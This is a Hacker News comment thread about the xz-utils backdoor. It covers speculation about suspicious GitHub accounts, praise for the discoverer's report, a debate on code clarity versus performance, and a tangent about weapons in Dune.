[bombcar](user?id=bombcar) [9 months ago](item?id=39868689)   | [root](#39866611) | [parent](#39868199) | [next](#39866897) [–]  Yubikeys starting to look kinda yummy. | | --- | --- | --- | | | |  |  | [wiml](user?id=wiml) [9 months ago](item?id=39869175)   | [root](#39866611) | [parent](#39868689) | [next](#39866897) [–]  Hardware gets backdoored too, remember Crypto AG? | | --- | --- | --- | | | |  |  | [returningfory2](user?id=returningfory2) [9 months ago](item?id=39866897)   | [root](#39866611) | [parent](#39866882) | [prev](#39868199) | [next](#39866767) [–]  Yeah the GitHub account looks really really legitimate. Maybe it was compromised though? | | --- | --- | --- | | | |  |  | [jethro\_tell](user?id=jethro_tell) [9 months ago](item?id=39867024)   | [root](#39866611) | [parent](#39866897) | [next](#39868136) [–]  What looks legit about a gmail address and some stock art for a profile? | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39867601)   | [root](#39866611) | [parent](#39867024) | [next](#39867966) [–]  [Deleted per below] | | --- | --- | --- | | | |  |  | [Jyaif](user?id=Jyaif) [9 months ago](item?id=39868142)   | [root](#39866611) | [parent](#39867601) | [next](#39867783) [–]  You are not looking at the right profile. This is the profile that people are talking about: <https://github.com/jaredallard> | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39868193)   | [root](#39866611) | [parent](#39868142) | [next](#39867783) [–]  Oops, you're absolutely correct. Deleted (via edit) my comment above. Thanks. | | --- | --- | --- | | | |  |  | [TeMPOraL](user?id=TeMPOraL) [9 months ago](item?id=39867783)   | [root](#39866611) | [parent](#39867601) | [prev](#39868142) | [next](#39868155) [–]  Can you stay in that org after leaving Google? | | --- | --- | --- | | | |  |  | [bananapub](user?id=bananapub) [9 months ago](item?id=39869022)   | [root](#39866611) | [parent](#39867783) | [next](#39869647) [–]  whoever is in charge of removing people from the Google github org has the itchiest trigger finger in the whole exiting-the-company process tree. | | --- | --- | --- | | | |  |  | [fooker](user?id=fooker) [9 months ago](item?id=39869647)   | [root](#39866611) | [parent](#39867783) | [prev](#39869022) | [next](#39868155) [–]  No | | --- | --- | --- | | | |  |  | [ncr100](user?id=ncr100) [9 months ago](item?id=39868155)   | [root](#39866611) | [parent](#39867601) | [prev](#39867783) | [next](#39867966) [–]  He was just (50 minutes ago) removed from the oss fuzz repo. I hope this also (at least temporarily until verification of 'bad/good') remove him from the org? | | --- | --- | --- | | | |  |  | [buildbot](user?id=buildbot) [9 months ago](item?id=39867966)   | [root](#39866611) | [parent](#39867024) | [prev](#39867601) | [next](#39868136) [–]  Plus the README.md that is just a rickroll | | --- | --- | --- | | | |  |  | [ncr100](user?id=ncr100) [9 months ago](item?id=39868136)   | [root](#39866611) | [parent](#39866897) | [prev](#39867024) | [next](#39868489) [–]  The 2 GMail accounts are 85% / mainly associated with XZ work, since 2021, per searching for them explicitly via Google. | | --- | --- | --- | | | |  |  | [computerfriend](user?id=computerfriend) [9 months ago](item?id=39868489)   | [root](#39866611) | [parent](#39866897) | [prev](#39868136) | [next](#39866767) [–]  The PR's two commits are signed by a key that was also used to sign previous commits belonging to that author. | | --- | --- | --- | | | |  |  | [dralley](user?id=dralley) [9 months ago](item?id=39868961)   | [root](#39866611) | [parent](#39868489) | [next](#39866767) [–]  Hold up, are you saying that <https://github.com/jaredallard> and the accounts affiliated with this XZ backdoor share a PGP key? Or something else? | | --- | --- | --- | | | |  |  | [computerfriend](user?id=computerfriend) [9 months ago](item?id=39869084)   | [root](#39866611) | [parent](#39868961) | [next](#39866767) [–]  No, this account made a PR and their commits were signed [1]. Take a look at their other repositories, e.g. they did AoC 2023 in Rust and published it, the commits in that repository are signed by the same key. So this is not (just) a GitHub account compromise. I find this aspect to be an outlier, the other attacker accounts were cutouts. So this doesn't quite make sense to me. [1] <https://github.com/jamespfennell/xz/pull/2/commits> | | --- | --- | --- | | | |  |  | [pinko](user?id=pinko) [9 months ago](item?id=39866767)   | [parent](#39866611) | [prev](#39866882) | [next](#39868877) [–]  > it's not the same GitHub account as upstream This is valuable information, and a sign that this may be the tip of an iceberg. | | --- | --- | --- | | | |  |  | [cbmuser](user?id=cbmuser) [9 months ago](item?id=39868877)   | [parent](#39866611) | [prev](#39866767) | [next](#39870348) [–]  There was also a bug report in Debian which requested updating xz-utils to 5.6.1: <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708> | | --- | --- | --- | | | |  |  | [roflmaostc](user?id=roflmaostc) [9 months ago](item?id=39870259)   | [root](#39866611) | [parent](#39868877) | [next](#39870348) [–]  That's the same Hans Jansen mentioned here: [https://boehs.org/node/everything-i-know-about-the-xz-backdo...](https://boehs.org/node/everything-i-know-about-the-xz-backdoor) | | --- | --- | --- | | | |  |  | [icambron](user?id=icambron) [9 months ago](item?id=39870348)   | [parent](#39866611) | [prev](#39868877) | [next](#39867123) [–]  IMO your prior on this should be that it's most likely just someone innocently updating a dependency. | | --- | --- | --- | | | |  |  | [5kg](user?id=5kg) [9 months ago](item?id=39867123)   | [parent](#39866611) | [prev](#39870348) | [next](#39871932) [–]  The backdoor (test binary blob and autoconf) is not part of the pull request. | | --- | --- | --- | | | |  |  | [baxtr](user?id=baxtr) [9 months ago](item?id=39871932)   | [parent](#39866611) | [prev](#39867123) | [next](#39871928) [–]  Suddenly anything like that becomes super suspicious. I wonder how this will affect the OS community in general. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39917387)   | [root](#39866611) | [parent](#39871932) | [next](#39871928) [–]  More caution might not be a bad thing. | | --- | --- | --- | | | |  |  | [squigz](user?id=squigz) [9 months ago](item?id=39871928)   | [parent](#39866611) | [prev](#39871932) | [next](#39866073) [–]  Internet detectives at work in this thread! | | --- | --- | --- | | | |  |  | [cf100clunk](user?id=cf100clunk) [9 months ago](item?id=39866073)   | [prev](#39866611) | [next](#39869942) [–]   ```   I am *not* a security researcher, nor a reverse engineer.  There's lots of   stuff I have not analyzed and most of what I observed is purely from   observation rather than exhaustively analyzing the backdoor code. ``` I love this sort of technical writing from contributors outside the mainstream debugging world who might be averse to sharing. What an excellently summarized report of his findings that should be seen as a template. | | --- | --- | --- | | | |  |  | [anarazel](user?id=anarazel) [9 months ago](item?id=39866821)   | [parent](#39866073) | [next](#39867526) [–]  FWIW, it felt intimidating as hell. And I'm fairly established professionally. Not sure what I'd have done earlier in my career (although I'd probably not have found it in the first place). | | --- | --- | --- | | | |  |  | [internetter](user?id=internetter) [9 months ago](item?id=39867170)   | [root](#39866073) | [parent](#39866821) | [next](#39873867) [–]  > Not sure what I'd have done earlier in my career To anybody in this sorta situation, you should absolutely share whatever you have. It doesn’t need to be perfect, good, or 100% accurate, but if there’s a risk you could help a lot of people | | --- | --- | --- | | | |  |  | [aerhardt](user?id=aerhardt) [9 months ago](item?id=39873867)   | [root](#39866073) | [parent](#39866821) | [prev](#39867170) | [next](#39873196) [–]  This story is an incredible testament to how open-source software can self-regulate against threats, and more broadly, it reminds us that we all stand on the shoulders of contributors like you. Thank you! | | --- | --- | --- | | | |  |  | [ddalex](user?id=ddalex) [9 months ago](item?id=39874848)   | [root](#39866073) | [parent](#39873867) | [next](#39873196) [–]  This is one threat that was discovered, only because the implementer was sloppy. Think about what various corps and state-level actors have been putting in there. | | --- | --- | --- | | | |  |  | [RockRobotRock](user?id=RockRobotRock) [9 months ago](item?id=39873196)   | [root](#39866073) | [parent](#39866821) | [prev](#39873867) | [next](#39867526) [–]  I hope you've hired a PR person for all the interviews :) | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39867526)   | [parent](#39866073) | [prev](#39866821) | [next](#39868855) [–]  For what it's worth the author is a PostgreSQL committer, he's not a security researcher but he's a pretty damn good engineer! | | --- | --- | --- | | | |  |  | [vhiremath4](user?id=vhiremath4) [9 months ago](item?id=39868855)   | [parent](#39866073) | [prev](#39867526) | [next](#39869942) [–]  Honestly, you only get this kind of humility when you're working with absolute wizards on a consistent basis. That's how I read that whole analysis. Absolutely fascinating. | | --- | --- | --- | | | |  |  | [dang](user?id=dang) [9 months ago](item?id=39869942)   | [prev](#39866073) | [next](#39868682) [–]  Related ongoing threads: *Xz: Disable ifunc to fix Issue 60259* - <https://news.ycombinator.com/item?id=39869718> *FAQ on the xz-utils backdoor* - <https://news.ycombinator.com/item?id=39869068> *Everything I Know About the XZ Backdoor* - <https://news.ycombinator.com/item?id=39868673> | | --- | --- | --- | | | |  |  | [0xthr0w4](user?id=0xthr0w4) [9 months ago](item?id=39868682)   | [prev](#39869942) | [next](#39866721) [–]  Out of curiosity I looked at the list of followers of the account who committed the backdoor. Randomly picked <https://github.com/Neustradamus> and looked at all their contributions. Interestingly enough, they got Microsoft to upgrade ([0],[1]) `vcpkg` to liblzma 5.6.0 3 weeks ago. [0] <https://github.com/microsoft/vcpkg/issues/37197> [1] <https://github.com/microsoft/vcpkg/pull/37199> | | --- | --- | --- | | | |  |  | [sroussey](user?id=sroussey) [9 months ago](item?id=39869333)   | [parent](#39868682) | [next](#39872595) [–]  OMG: look at the other contributions. He is trying to take over projects and pushing some change to sha256 in a hundred projects. Example: <https://github.com/duesee/imap-flow/issues/96> | | --- | --- | --- | | | |  |  | [masklinn](user?id=masklinn) [9 months ago](item?id=39869717)   | [root](#39868682) | [parent](#39869333) | [next](#39871808) [–]  This guy's interactions seem weird but it might just be because of the non-native english or a strange attitude, or he's very good at covering his track e.g. found a cpython issue where he got reprimanded for serially opening issues: [https://github.com/python/cpython/issues/115195#issuecomment...](https://github.com/python/cpython/issues/115195#issuecomment-1935707908) But clicking around he seems to mostly be interacting with interest around these bits e.g. [https://github.com/python/cpython/issues/95341#issuecomment-...](https://github.com/python/cpython/issues/95341#issuecomment-1802889364) or pinging the entire python team to link to the PR... of a core python developer: [https://github.com/python/cpython/issues/95341#issuecomment-...](https://github.com/python/cpython/issues/95341#issuecomment-1872618454) If I saw that on a $dayjob project I'd pit him as an innocuous pain in the ass (overly excited, noisy, dickriding). Here's a PR from 2020 where he recommends / requests the addition of SCRAM to an SMTP client: <https://github.com/marlam/msmtp/issues/36> which is basically the same thing as the PR you found. The linked documents seem genuine, and SCRAM is an actual challenge/response authentication method for a variety of protocols (in this case mostly SMTP, IMAP, and XMPP): [https://en.wikipedia.org/wiki/Salted\_Challenge\_Response\_Auth...](https://en.wikipedia.org/wiki/Salted_Challenge_Response_Authentication_Mechanism) Although, and that's a bit creepy, he shows up in the edition history for the SCRAM page, the edit mostly seem innocent though he does plug his "state of play" github repository. | | --- | --- | --- | | | |  |  | [robocat](user?id=robocat) [9 months ago](item?id=39872108)   | [root](#39868682) | [parent](#39869717) | [next](#39875133) [–]  > dickriding <https://www.urbandictionary.com/define.php?term=Dickriding> I guess I'm not in the right demographic to know the term. | | --- | --- | --- | | | |  |  | [JdeBP](user?id=JdeBP) [9 months ago](item?id=39926238)   | [root](#39868682) | [parent](#39872108) | [next](#39875133) [–]  "fawning" or "ingratiating" seem to be the standard English words for this. | | --- | --- | --- | | | |  |  | [sroussey](user?id=sroussey) [9 months ago](item?id=39875133)   | [root](#39868682) | [parent](#39869717) | [prev](#39872108) | [next](#39871808) [–]  True, it does seem innocent enough upon more reflection. | | --- | --- | --- | | | |  |  | [arp242](user?id=arp242) [9 months ago](item?id=39871808)   | [root](#39868682) | [parent](#39869333) | [prev](#39869717) | [next](#39876268) [–]  What? They're just asking for some features there? Ya'll need to calm down; this is getting silly. Half the GitHub accounts look "suspicious" if you start scrutinizing everything down the the microscopic detail. | | --- | --- | --- | | | |  |  | [gaucheries](user?id=gaucheries) [9 months ago](item?id=39876268)   | [root](#39868682) | [parent](#39869333) | [prev](#39871808) | [next](#39871685) [–]  I appreciate the way that duesee handled that whole issue. | | --- | --- | --- | | | |  |  | [gowthamgts12](user?id=gowthamgts12) [9 months ago](item?id=39871685)   | [root](#39868682) | [parent](#39869333) | [prev](#39876268) | [next](#39872595) [–]  reported the account to github, just in case. | | --- | --- | --- | | | |  |  | [asmor](user?id=asmor) [9 months ago](item?id=39872595)   | [parent](#39868682) | [prev](#39869333) | [next](#39873571) [–]  Hey, I remember this guy! Buddy of someone who tried to get a bunch of low quality stuff into ifupdown-ng, including copying code with an incompatible license and removing the notice. He's in every PR, complaining the "project is dead". He even pushes for the account to be made "team member". <https://github.com/ifupdown-ng/ifupdown-ng/pulls/easynetdev> He follows 54k accounts though, so it may indeed just be coincidence. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39918112)   | [root](#39868682) | [parent](#39872595) | [next](#39890703) [–]  The PR + angry user pushing for the PR author to gain commit access spiel is definitely suspiciously similar to what happened with xz-utils. Possible coincidence but worth investigating further. | | --- | --- | --- | | | |  |  | [dikei](user?id=dikei) [9 months ago](item?id=39890703)   | [root](#39868682) | [parent](#39872595) | [prev](#39918112) | [next](#39873571) [–]  I wouldn't be surprised if that is just a bot. He even follows me, though I have never published any open-source project on my own. | | --- | --- | --- | | | |  |  | [neustradamus](user?id=neustradamus) [9 months ago](item?id=39873571)   | [parent](#39868682) | [prev](#39872595) | [next](#39866721) [–]  Dear @0xthr0w4, do you attack me because I have requested the XZ update? Do not mix, I am not linked to the XZ project. | | --- | --- | --- | | | |  |  | [resonious](user?id=resonious) [9 months ago](item?id=39881295)   | [root](#39868682) | [parent](#39873571) | [next](#39866721) [–]  The parent comment doesn't read like an attack to me. Just an observation. Would be curious why you wanted the update though. | | --- | --- | --- | | | |  |  | [perihelions](user?id=perihelions) [9 months ago](item?id=39866721)   | [prev](#39868682) | [next](#39867106) [–]  Imagine a more competent backdoor attempt on xz(1)—one that wouldn't have been noticed this quickly. xz is everywhere. They could pull off a "reflections on trusting trust": an xz which selectively modifies a tiny subset of the files it sees, like .tar.xz software tarballs underlying certain build processes. Not source code tarballs (someone might notice)—tarballs distributing pre-compiled binaries. edit to add: Arch Linux' entire package system used to run on .tar.xz binaries (they switched to Zstd a few years ago [0]). [0] <https://news.ycombinator.com/item?id=19478171> (*"Arch Linux propose changing compression method from xz to zstd (archlinux.org)"*) | | --- | --- | --- | | | |  |  | [joeyh](user?id=joeyh) [9 months ago](item?id=39867508)   | [parent](#39866721) | [next](#39867585) [–]  A backdoored xz could also run payloads hidden inside other xz files, allowing targeted attacks. | | --- | --- | --- | | | |  |  | [Phenylacetyl](user?id=Phenylacetyl) [9 months ago](item?id=39867585)   | [parent](#39866721) | [prev](#39867508) | [next](#39866996) [–]  The same authors have also contributed to Zstd | | --- | --- | --- | | | |  |  | [joeyh](user?id=joeyh) [9 months ago](item?id=39868805)   | [root](#39866721) | [parent](#39867585) | [next](#39866996) [–]  details please? I do not see any such contributions to <https://github.com/facebook/zstd> | | --- | --- | --- | | | |  |  | [delfinom](user?id=delfinom) [9 months ago](item?id=39875663)   | [root](#39866721) | [parent](#39868805) | [next](#39866996) [–]  They are probably getting confused. Jia had a zstd fork on github, but when things kicked off, it appears they may have sanitized the fork. | | --- | --- | --- | | | |  |  | [nolist\_policy](user?id=nolist_policy) [9 months ago](item?id=39866996)   | [parent](#39866721) | [prev](#39867585) | [next](#39867106) [–]  deb packages are xz compressed... | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [9 months ago](item?id=39870033)   | [root](#39866721) | [parent](#39866996) | [next](#39876048) [–]  my freaking kernels/initrd are xz or zstd compressed! | | --- | --- | --- | | | |  |  | [nolist\_policy](user?id=nolist_policy) [9 months ago](item?id=39876048)   | [root](#39866721) | [parent](#39866996) | [prev](#39870033) | [next](#39867106) [–]  ... and Debian is very serious about it: [https://fulda.social/@Ganneff/112184975950858403](https://fulda.social/%40Ganneff/112184975950858403) | | --- | --- | --- | | | |  |  | [pfortuny](user?id=pfortuny) [9 months ago](item?id=39867106)   | [prev](#39866721) | [next](#39874942) [–]  Unfortunately, this is how *good* bad actors work: with a very long-term point of view. There is no “harmless” project any more. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39869863)   | [parent](#39867106) | [next](#39867911) [–]  And, Joey Hess has counted at least 750 commits to xz from that handle. [https://hachyderm.io/@joeyh/112180715824680521](https://hachyderm.io/%40joeyh/112180715824680521) This does not look trust-inspiring. If the code is complex, there could be many more exploits hiding. | | --- | --- | --- | | | |  |  | [ebfe1](user?id=ebfe1) [9 months ago](item?id=39870048)   | [root](#39867106) | [parent](#39869863) | [next](#39872730) [–]  clickhouse has pretty good github\_events dataset on playground that folks can use to do some research - some info on the dataset <https://ghe.clickhouse.tech/> Example of what this user JiaT75 did so far: [https://play.clickhouse.com/play?user=play#U0VMRUNUICogRlJPT...](https://play.clickhouse.com/play?user=play#U0VMRUNUICogRlJPTSBnaXRodWJfZXZlbnRzIFdIRVJFIGFjdG9yX2xvZ2luPSdKaWFUNzUnIE9SREVSIEJZIGZpbGVfdGltZSBERVND) pull requests mentioning xz, 5.6 without downgrade, cve being mentioned in the last 60 days: [https://play.clickhouse.com/play?user=play#U0VMRUNUIGNyZWF0Z...](https://play.clickhouse.com/play?user=play#U0VMRUNUIGNyZWF0ZWRfYXQsIGV2ZW50X3R5cGUsIGFjdG9yX2xvZ2luLCByZXBvX25hbWUsdGl0bGUsYWN0aW9uLCBzdWJzdHJpbmcoYm9keSwgMSwgMjAwKSBhcyBib2R5X3RydW5jYXRlZCAgRlJPTSBnaXRodWJfZXZlbnRzIFdIRVJFIGZpbGVfdGltZSA+IG5vdygpIC0gSU5URVJWQUwgNjAgREFZIEFORCBldmVudF90eXBlPSdQdWxsUmVxdWVzdEV2ZW50JyBBTkQgdGl0bGUgSUxJS0UgJyU1LjYlJyBBTkQgdGl0bGUgSUxJS0UgJyV4eiUnIEFORCBib2R5IE5PVCBJTElLRSAnJVNueWslJyBhbmQgYm9keSBub3QgaWxpa2UgJyVDVkUtMjAyNC0zMDk0JScgYW5kIHRpdGxlIG5vdCBpbGlrZSAnJWRvd25ncmFkZSUnIE9SREVSIEJZIGZpbGVfdGltZSBERVNDIExJTUlUIDEwMA==) | | --- | --- | --- | | | |  |  | [palijer](user?id=palijer) [9 months ago](item?id=39879537)   | [root](#39867106) | [parent](#39870048) | [next](#39872730) [–]  Yeah. It would be interesting to see who adopted to the compromised versions and how quickly, compared to how quickly they normally adopt new versions (not bots pulling upgrades, but how quickly maintainers approve and merge them) If there were a bunch of people who adopted it abnormally fast compared to usual, might point to there being more "bad actors" in this operation (said at the risk of sounding paranoid if this turns out to be a state run thing) | | --- | --- | --- | | | |  |  | [codedokode](user?id=codedokode) [9 months ago](item?id=39872730)   | [root](#39867106) | [parent](#39869863) | [prev](#39870048) | [next](#39872145) [–]  > If the code is complex, there could be many more exploits hiding. Then the code should not be complex. Low-level hacks and tricks (like pointer juggling) should be not allowed and simplicity and readability should be preferred. | | --- | --- | --- | | | |  |  | [sgarland](user?id=sgarland) [9 months ago](item?id=39874630)   | [root](#39867106) | [parent](#39872730) | [next](#39872145) [–]  For tools like compression programs, you’d generally prefer performance over everything (except data corruption, of course). | | --- | --- | --- | | | |  |  | [jononor](user?id=jononor) [9 months ago](item?id=39874837)   | [root](#39867106) | [parent](#39874630) | [next](#39872145) [–]  Probably you would prefer no backdoors also? Performance without correctness or trustworthiness is useless. | | --- | --- | --- | | | |  |  | [sgarland](user?id=sgarland) [9 months ago](item?id=39875025)   | [root](#39867106) | [parent](#39874837) | [next](#39872145) [–]  Yes, but my point was that at the level of performance tools like this are expected to operate at, it’s highly probable that you’ll need to get into incredibly esoteric code. Look at ffmpeg – tons of hand-written Assembly, because they need it. To be clear, I have no idea how to solve this problem; I just don’t think saying that all code must be non-hacky is the right approach. | | --- | --- | --- | | | |  |  | [jononor](user?id=jononor) [9 months ago](item?id=39876622)   | [root](#39867106) | [parent](#39875025) | [next](#39872145) [–]  Performance can be bought with better hardware. It gets cheaper and cheaper every year. Trustworthiness cannot be purchased in the same way. I do not understand why performance would ever trumph clean code, especially for for code that processes user provided input. | | --- | --- | --- | | | |  |  | [sgarland](user?id=sgarland) [9 months ago](item?id=39878120)   | [root](#39867106) | [parent](#39876622) | [next](#39878373) [–]  This attitude is how we get streaming music players that consume in excess of 1 GiB of RAM. Performant code needn’t be unclean; it’s just often using deeper parts of the language. I have a small project that became absolute spaghetti. I rewrote it to be modular, using lots of classes, inheritance, etc. It was then slower, but eminently more maintainable and extensible. I’m addressing that by using more advanced features of the language (Python), like MemoryView for IPC between the C libraries it calls. I don’t consider this unclean, but it’s certainly not something you’re likely to find on a Medium article or Twitter take. I value performant code above nearly everything else. I’m doing this for me, there are no other maintainers, and it’s what I enjoy. You’re welcome to prioritize something else in your projects, but it doesn’t make other viewpoints objectively worse. | | --- | --- | --- | | | |  |  | [jononor](user?id=jononor) [9 months ago](item?id=39879788)   | [root](#39867106) | [parent](#39878120) | [next](#39878373) [–]  Performant code does not need to be unclean, exactly! My original point was just to not put performance on a pedestal. Sure, prioritize it, but correct and clean should come first - at least for foundational libraries that others are supposed to build upon. I maintain ML libraries that run on microcontrollers with kilobytes of memory, performance is a friend of mine ;) | | --- | --- | --- | | | |  |  | [josefx](user?id=josefx) [9 months ago](item?id=39878373)   | [root](#39867106) | [parent](#39876622) | [prev](#39878120) | [next](#39881891) [–]  I suggest you run your browsers Javascript engine in interpreter mode to understand how crippling the simple and sraight forward solution is to performance. | | --- | --- | --- | | | |  |  | [sdlion](user?id=sdlion) [9 months ago](item?id=39881891)   | [root](#39867106) | [parent](#39876622) | [prev](#39878373) | [next](#39877212) [–]  I guess because at server farm level, performance/efficiency translate to real million USD savings. In general, at scale ends (the cloud and the embedded) this matters a lot. In resource limited environments like raspberry pi, this design philosophy wins over many users between DIY and the private industry. | | --- | --- | --- | | | |  |  | [patchguard](user?id=patchguard) [9 months ago](item?id=39877212)   | [root](#39867106) | [parent](#39876622) | [prev](#39881891) | [next](#39912796) [–]  > Performance can be bought with better hardware. I hate this argument. If current hardware promises you a theoretical throughput of 100 MB/s for an operation, someone will try to hit that limit. Your program that has no hard to understand code but gives me 5 MB/s will loose in the face of a faster one, even if that means writing harder to understand code. | | --- | --- | --- | | | |  |  | [jononor](user?id=jononor) [9 months ago](item?id=39877499)   | [root](#39867106) | [parent](#39877212) | [next](#39912796) [–]  There is no reason that understandable and safe code will hit just 5% of a theoretical max. It may be closer to 95%. | | --- | --- | --- | | | |  |  | [sgarland](user?id=sgarland) [9 months ago](item?id=39878235)   | [root](#39867106) | [parent](#39877499) | [next](#39912796) [–]  No, but often it is far worse than 95%. A good example is random.randint() vs math.ceil(random.random() \* N) in Python. The former is approximately 5x slower than the latter, but they produce effectively the same result with large enough values of N. This isn’t immediately apparent from using them or reading docs, and it’s only really an issue in hot loops. Another favorite of mine is bitshifting / bitwise operators. Clear and obvious? Depends on your background. Fast as hell? Yes, always. It isn’t always needed, but when it is, it will blow anything else out of the water. | | --- | --- | --- | | | |  |  | [jodleif](user?id=jodleif) [9 months ago](item?id=39882812)   | [root](#39867106) | [parent](#39878235) | [next](#39879850) [–]  The compiler will almost always do the bit shifting, and better for you. Just switch python with rust and you’ll get both performance and safe code | | --- | --- | --- | | | |  |  | [jononor](user?id=jononor) [9 months ago](item?id=39879850)   | [root](#39867106) | [parent](#39878235) | [prev](#39882812) | [next](#39912796) [–]  Those Python snippets are both clean options :) Bitwise is highly context dependent. There are simple usages like shifts to divide/multiply by 2. Idiomatic patterns that are clean when wrapped in good reusable and restricted macros, like for common registers manipulation in microcontrollers. And other uses that are anything from involuntary obfuscation to competition grade obfuscation. | | --- | --- | --- | | | |  |  | [throwaway7356](user?id=throwaway7356) [9 months ago](item?id=39881572)   | [root](#39867106) | [parent](#39879850) | [next](#39912796) [–]  > There are simple usages like shifts to divide/multiply by 2. Clean code should not do that as the compiler will do that. Clean code should just say what it wants to do, not replace that with low-level performance optimizations. (Also wasn't performance to be obtained from newer hardware?) | | --- | --- | --- | | | |  |  | [jononor](user?id=jononor) [9 months ago](item?id=39896047)   | [root](#39867106) | [parent](#39881572) | [next](#39912796) [–]  Fair point about shifting being superfluous and not clean! I never said performance should come only from newer hardware. Only that it is possible to trade vs hardware/costs - unlike correctness and trust. | | --- | --- | --- | | | |  |  | [caspianm](user?id=caspianm) [9 months ago](item?id=39912796)   | [root](#39867106) | [parent](#39876622) | [prev](#39877212) | [next](#39872145) [–]  Faster and more complex hardware can also have bugs or back doors, as can cheaper hardware. That said, I'm not happy with buggy and untrustworthy code either. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39872145)   | [root](#39867106) | [parent](#39869863) | [prev](#39872730) | [next](#39874979) [–]  If this is a conspiracy or a state-sponsored attack, they might have gone specifically for embedded devices and the linux kernel. Here archived from tukaani.org: [https://web.archive.org/web/20110831134700/http://tukaani.or...](https://web.archive.org/web/20110831134700/http%3A//tukaani.org/xz/embedded.html) > XZ Embedded is a relatively small decompressor for the XZ format. It was developed with the Linux kernel in mind, but is easily usable in other projects too. > \*Features\* > \* Compiled code 8-20 KiB > [...] > \* All the required memory is allocated at initialization time. This is targeted at embedded and real-time stuff. Could even be part of boot loaders in things like buildroot or RTEMS. And this means potentially millions of devices, from smart toasters or toothbrushes to satellites and missiles which most can't be updated with security fixes. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39872592)   | [root](#39867106) | [parent](#39872145) | [next](#39872878) [–]  One scenario for malicious code in embedded devices would be a kind of killswitch which listens to a specific byte sequence and crashes when encountering it. For a state actor, having such an exploit would be gold. | | --- | --- | --- | | | |  |  | [HankB99](user?id=HankB99) [9 months ago](item?id=39875444)   | [root](#39867106) | [parent](#39872592) | [next](#39872878) [–]  That's an "interesting" thought. One of my complaints about so many SciFi stories is the use of seemingly conventional weapons. I always thought that with so much advanced technology that weapons would be much more sophisticated. However if the next "great war" is won not by the side with the most destructive weapons but by the side with the best kill switch, subsequent conflicts might be fought with weapons that did not rely on any kind of computer assistance. This is eerily similar to Einstein's (purported) statement that if World War III was fought with nuclear weapons, World War IV would be fought with sticks and stones. Similar, but for entirely different reasons. I'm trying to understand why the characters in Dune fought with swords, pikes and knives. | | --- | --- | --- | | | |  |  | [cblum](user?id=cblum) [9 months ago](item?id=39875847)   | [root](#39867106) | [parent](#39875444) | [next](#39875656) [–]  > I'm trying to understand why the characters in Dune fought with swords, pikes and knives. At least part of the reason is that the interaction between a lasgun and a shield would cause a powerful explosion that would kill the shooter too. No one wants that and no one will give up their shield, so they had to go back to melee weapons. | | --- | --- | --- | | | |  |  | [potro](user?id=potro) [9 months ago](item?id=39876302)   | [root](#39867106) | [parent](#39875847) | [next](#39875656) [–]  Were drones unthinkable at the time of Dune creation? Or suicide attacks? | | --- | --- | --- | | | |  |  | [throwaway7356](user?id=throwaway7356) [9 months ago](item?id=39876385)   | [root](#39867106) | [parent](#39876302) | [next](#39878834) [–]  No, there is a in-world reason at least for no drones. Wikipedia: > However, a great reaction against computers has resulted in a ban on any "thinking machine", with the creation or possession of such punishable by immediate death. | | --- | --- | --- | | | |  |  | [ethbr1](user?id=ethbr1) [9 months ago](item?id=39878305)   | [root](#39867106) | [parent](#39876385) | [next](#39878834) [–]  For anyone who wants the short version: <https://www.youtube.com/watch?v=2YnAs4NpRd8> tl;dr - Machine intelligences existed in Dune history, were discovered to be secretly controlling humanity (through abortion under false pretenses, forced sterilization, emotional/social control, and other ways), then were purged and replaced with a religious commandment: "Thou shalt not make a machine in the likeness of a human mind" | | --- | --- | --- | | | |  |  | [cam-o-man](user?id=cam-o-man) [9 months ago](item?id=39878834)   | [root](#39867106) | [parent](#39876302) | [prev](#39876385) | [next](#39877136) [–]  No, and there is a (piloted) drone attack in the first book -- Paul is attacked by a hunter-seeker. The reason nobody tries to use the lasgun-shield interaction as a weapon is because the resulting explosion is indistinguishable from a nuclear weapon, and the Great Convention prohibits the use of nukes on human targets. Just the *perception* of having used a nuclear device would result in the House which did so becoming public enemy #1 and being eradicated by the Landsraad and Sardaukar combined. | | --- | --- | --- | | | |  |  | [archi42](user?id=archi42) [9 months ago](item?id=39880291)   | [root](#39867106) | [parent](#39878834) | [next](#39877136) [–]  Nope. That's all I'm going to spoiler;-) @Potro: If you liked the movie, read the books. I don't read a lot anymore, but during sick leave I started with the first book. Didn't stop until I finished the main story, including the sequels by Frank Herbert's son about a month later. That's like... uh... nine books? | | --- | --- | --- | | | |  |  | [lobocinza](user?id=lobocinza) [9 months ago](item?id=39877136)   | [root](#39867106) | [parent](#39876302) | [prev](#39878834) | [next](#39876427) [–]  In the book Paul is attacked by an insect drone while in his room. The drone was controlled by a Harkonnen agent placed weeks in anticipation inside a structure of the palace so it was also a suicide attack as the agent had no chance to escape and would die of hunger/thirsty if not found. | | --- | --- | --- | | | |  |  | [Muromec](user?id=Muromec) [9 months ago](item?id=39876427)   | [root](#39867106) | [parent](#39876302) | [prev](#39877136) | [next](#39875656) [–]  There is a drone attack in a first movie | | --- | --- | --- | | | |  |  | [ethbr1](user?id=ethbr1) [9 months ago](item?id=39875656)   | [root](#39867106) | [parent](#39875444) | [prev](#39875847) | [next](#39882741) [–]  > *I'm trying to understand why the characters in Dune fought with swords, pikes and knives.* Because the slow blade penetrates the shield. (And personal shields are omnipresent) | | --- | --- | --- | | | |  |  | [mr\_toad](user?id=mr_toad) [9 months ago](item?id=39882741)   | [root](#39867106) | [parent](#39875444) | [prev](#39875656) | [next](#39872878) [–]  > I'm trying to understand why the characters in Dune fought with swords, pikes and knives. Because the author wanted a pseudo-medieval setting. (The shields and the prohibition against computers, nukes etc were just clever plot devices to make advanced weapons unusable). | | --- | --- | --- | | | |  |  | [varjag](user?id=varjag) [9 months ago](item?id=39872878)   | [root](#39867106) | [parent](#39872145) | [prev](#39872592) | [next](#39872385) [–]  All this circus makes me happy for never moving from sysvinit on embedded. | | --- | --- | --- 